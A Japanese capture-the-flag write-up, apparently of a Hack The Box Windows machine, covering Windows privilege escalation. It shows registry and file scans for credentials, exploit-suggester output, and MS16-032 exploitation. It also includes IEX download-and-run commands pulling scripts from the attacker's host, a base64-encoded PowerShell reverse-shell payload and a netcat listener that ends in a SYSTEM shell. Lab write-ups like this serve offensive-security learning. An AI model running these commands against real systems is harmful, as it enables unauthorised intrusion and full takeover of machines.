Looking inside HKCU\Software\ORL\WinVNC3\Password                                                                                                                                                                                           
Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password                                                                                                                                                                         
Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon                                                                                                                                                                   
    DefaultDomainName    REG_SZ                                                                                                                                                                                                             
    DefaultUserName    REG_SZ                                                                                                                                                                                                               
Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP                                                                                                                                                                                  
Looking inside HKCU\Software\TightVNC\Server                                                                                                                                                                                                
Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions                                                                                                                                                                                     
Looking inside HKCU\Software\OpenSSH\Agent\Keys                                                                                                                                                                                             
C:\Windows\Panther\setupinfo                                                                                                                                                                                                                
C:\Windows\WinSxS\amd64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_64e8a179c6f2a167\ScheduledTasks.xml                                                                                                                              
C:\Windows\WinSxS\amd64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_824aabe06aee1705\ScheduledTasks.xml                                                                                                                               
C:\Windows\WinSxS\amd64_microsoft-windows-d..rvices-domain-files_31bf3856ad364e35_6.3.9600.16384_none_8bc96e4517571480\ntds.dit                                                                                                             
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_01a7d2cf88c95dc0\appcmd.exe                                                                                                              
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_01dac51388a3a832\appcmd.exe                                                                                                              
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17415_none_01f46dab888fca48\appcmd.exe                                                                                                              
C:\Windows\WinSxS\amd64_microsoft-windows-webenroll.resources_31bf3856ad364e35_6.3.9600.16384_en-us_7427d216367d8d3f\certnew.cer                                                                                                            
C:\Windows\WinSxS\wow64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_6f3d4bcbfb536362\ScheduledTasks.xml                                                                                                                              
C:\Windows\WinSxS\wow64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_8c9f56329f4ed900\ScheduledTasks.xml                                                                                                                               
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_0bfc7d21bd2a1fbb\appcmd.exe                                                                                                              
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_0c2f6f65bd046a2d\appcmd.exe                                                                                                              
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17415_none_0c4917fdbcf08c43\appcmd.exe                                                                                                              
                                                                                                                                                                                                                                            
---                                                                                                                                                                                                                                         
Scan complete. 
```


## STEP 3
HotFixから脆弱性を探す  
めっちゃでできた、調べるのめんどくさいね
```sh
└─$ python3.13 wes.py ../systeminfo.txt -e -i 'Elevation of Privilege' > result.txt 
                                                                                                                                                                                                                                            

└─$ grep 'CVE' result.txt | sort | uniq                                            
CVE: CVE-2015-0002
CVE: CVE-2015-0004
CVE: CVE-2015-0016
CVE: CVE-2015-1701
CVE: CVE-2015-2524
CVE: CVE-2015-2525
CVE: CVE-2015-2552
CVE: CVE-2015-2553
CVE: CVE-2015-2554
CVE: CVE-2016-0099
CVE: CVE-2016-3237
CVE: CVE-2016-7255
CVE: CVE-2017-0005
CVE: CVE-2017-0213
CVE: CVE-2017-0263
CVE: CVE-2018-0748
CVE: CVE-2018-0749
CVE: CVE-2018-0752
CVE: CVE-2018-8410
CVE: CVE-2018-8411
CVE: CVE-2018-8440
CVE: CVE-2018-8453
CVE: CVE-2018-8550
CVE: CVE-2019-0543
CVE: CVE-2019-0552
CVE: CVE-2019-0555
CVE: CVE-2019-0570
CVE: CVE-2019-0730
CVE: CVE-2019-0731
CVE: CVE-2019-0735
CVE: CVE-2019-0796
CVE: CVE-2019-0805
CVE: CVE-2019-0836
CVE: CVE-2019-1458
CVE: CVE-2020-0642
CVE: CVE-2020-0668
CVE: CVE-2020-0787
CVE: CVE-2020-1027
CVE: CVE-2020-1048
CVE: CVE-2020-1054
CVE: CVE-2020-1337
CVE: CVE-2020-1472
CVE: CVE-2021-40449
CVE: CVE-2023-28252
CVE: CVE-2023-36874
```

## STEP 4
`Sherlock.ps1`でEoPを探す
```sh
└─$ wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/refs/heads/master/Sherlock.ps1
--2025-04-28 04:11:38--  https://raw.githubusercontent.com/rasta-mouse/Sherlock/refs/heads/master/Sherlock.ps1
Connecting to ... connected.
Proxy request sent, awaiting response... 200 OK
Length: 16663 (16K) [text/plain]
Saving to: ‘Sherlock.ps1’

Sherlock.ps1                                               100%[========================================================================================================================================>]  16.27K  --.-KB/s    in 0.002s  

2025-04-28 04:11:39 (8.72 MB/s) - ‘Sherlock.ps1’ saved [16663/16663]


└─$ python3.13 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
`MS16-032`が刺さりそう
```sh
S C:\Users\kostas\Desktop> iex(new-object net.webclient).downloadstring('http://10.10.16.3/Sherlock.ps1')
PS C:\Users\kostas\Desktop> Find-AllVulns

Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Not Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Not Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?
VulnStatus : Appears Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
VulnStatus : Appears Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html
VulnStatus : Not Vulnerable
```
PowreshellEmpireのPoCをKaliのWebサーバにアップロード  
またエクスプロイト時に実行させるリバースシェル用のスクリプト、今回はNishangのやつもリスナーのIPアドレスを更新してアップロード
```sh
└─$ cp /usr/share/powershell-empire/empire/server/data/module_source/privesc/Invoke-MS16032.ps1 .


└─$ cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 .


└─$ python3.13 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
一行目のコマンドで関数「Invoke-MS16032」がロードされ、２行目でリバースシェルスクリプトをSYSTEM権限で実行するかんじ  
エクスプロイト失敗
```sh
PS C:\Users\kostas\Desktop> IEX(new-object net.webclient).downloadstring('http://10.10.14.70/Invoke-MS16032.ps1')


PS C:\Users\kostas\Desktop> Invoke-MS16032 -Command "IEX(new-object net.webclient).downloadstring('http://10.10.14.70/Invoke-PowerShellTcpOneLine.ps1')"
     __ __ ___ ___   ___     ___ ___ ___ 
    |  V  |  _|_  | |  _|___|   |_  |_  |
    |     |_  |_| |_| . |___| | |_  |  _|
    |_|_|_|___|_____|___|   |___|___|___|
                                        
                   [by b33f -> @FuzzySec]
[!] No valid thread handles were captured, exiting!
```
現在のプロセスが64ビットかどうか確認すると32ビットであることが判明！
```sh
PS C:\Users\kostas\Desktop> [Environment]::Is64BitProcess
False
```
どうやら32ビットアプリケーションからパス指定なしでPowershellを実行すると32ビットPowershellになるらしい  
そうなると32ビットPowershellから64ビットアプリケーションを実行できなくなる  
おろらくHTTPFileServerは32ビットで動作しているため、リバースシェルのPowershellも32ビットが動作しているっぽい  
[このサイト](https://ss64.com/nt/syntax-64bit.html)から、32ビットから64ビットPowershellを実行するときは`C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe`を実行すればよいとわかった  
ということでPoCのペイロードを修正
```sh
payload = f'exec|C:\Windows\sysnative\WindowsPowerShell\\v1.0\powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_command}'
```
再度エクスプロイト、今度は64ビットPowershellをゲット
```sh
└─$ python3.13 49584.py
/home/kali/49584.py:32: SyntaxWarning: invalid escape sequence '\W'
  payload = f'exec|C:\Windows\sysnative\WindowsPowerShell\\v1.0\powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_command}'

Encoded the command in base64 format...

Encoded the payload and sent a HTTP GET request to the target...

Printing some information for debugging...
lhost:  10.10.14.109
lport:  4444
rhost:  10.129.8.79
rport:  80
payload:  exec|C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAwADkAIgAsADQANAA0ADQAKQA7ACAAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAIABbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7ACAAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsADAALAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAgACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAJABpACkAOwAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABHAGUAdAAtAEwAbwBjAGEAdABpAG8AbgApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACAAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

Listening for connection...
listening on [any] 4444 ...
connect to [10.10.14.109] from (UNKNOWN) [10.129.8.79] 49196

PS C:\Users\kostas\Desktop> [Environment]::Is64BitProcess
True
```
再度PoC実行、うまくいったぽい
```sh
PS C:\Users\kostas\Desktop> IEX(new-object net.webclient).downloadstring('http://10.10.14.70/Invoke-MS16032.ps1')


PS C:\Users\kostas\Desktop> Invoke-MS16032 -Command "IEX(new-object net.webclient).downloadstring('http://10.10.14.70/Invoke-PowerShellTcpOneLine.ps1')"
     __ __ ___ ___   ___     ___ ___ ___ 
    |  V  |  _|_  | |  _|___|   |_  |_  |
    |     |_  |_| |_| . |___| | |_  |  _|
    |_|_|_|___|_____|___|   |___|___|___|
                                        
                   [by b33f -> @FuzzySec]

[!] Holy handle leak Batman, we have a SYSTEM shell!!
```
新たにSYSTEM権限でリバースシェル取得成功！
```sh
└─$ rlwrap nc -lnvp 5555
listening on [any] 5555 ...

connect to [10.10.14.70] from (UNKNOWN) [10.129.6.249] 49193
PS C:\Users\kostas\Desktop> whoami
nt authority\system
```
